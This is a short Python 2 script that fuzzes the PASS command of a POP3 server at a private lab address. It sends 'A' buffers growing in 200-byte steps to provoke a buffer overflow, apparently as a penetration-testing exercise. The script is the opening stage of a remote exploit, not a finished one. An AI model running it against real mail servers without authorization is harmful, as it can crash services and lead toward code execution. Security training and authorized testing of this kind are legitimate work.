#!/usr/bin/python

import socket

# Create an array of buffers, from 1 to 5900, with increments of 200.

buff = ["A"]
counter = 100

while len(buff) <= 30:
   buff.append("A"*counter)
   counter=counter+200

for string in buff:
   print "Fuzzing PASS with %s bytes" % len(string)
   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect=s.connect(('10.11.14.166',110))
   s.recv(1024)
   s.send('USER test\r\n')
   s.recv(1024)
   s.send('PASS ' + string + '\r\n')
   s.send('QUIT\r\n')
   s.close()
